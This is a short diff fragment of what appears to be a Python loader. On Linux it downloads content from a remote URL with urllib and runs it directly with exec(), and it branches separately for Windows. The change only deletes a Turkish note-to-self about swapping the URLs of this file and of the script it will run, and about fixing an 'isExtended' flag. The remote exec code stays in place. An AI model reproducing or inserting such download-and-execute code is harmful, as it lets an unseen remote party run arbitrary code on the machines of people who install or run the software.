@@ -84,11 +84,6 @@ if platform.system()=='Linux':
         response_url = urllib.request.urlopen(url_repo)
         data_url = response_url.read()
         exec(data_url)
-'''
-Kendime not:
-Storage kisminda bu dosyanin ve calistiracagi scriptin urlsini degistirmeyi unutma, ayni zamanda 
-flag kisminda bir sikinti var isExtended 0 donuyor, onu coz 
-'''
 
 #Windows
 if platform.system()=='Windows':
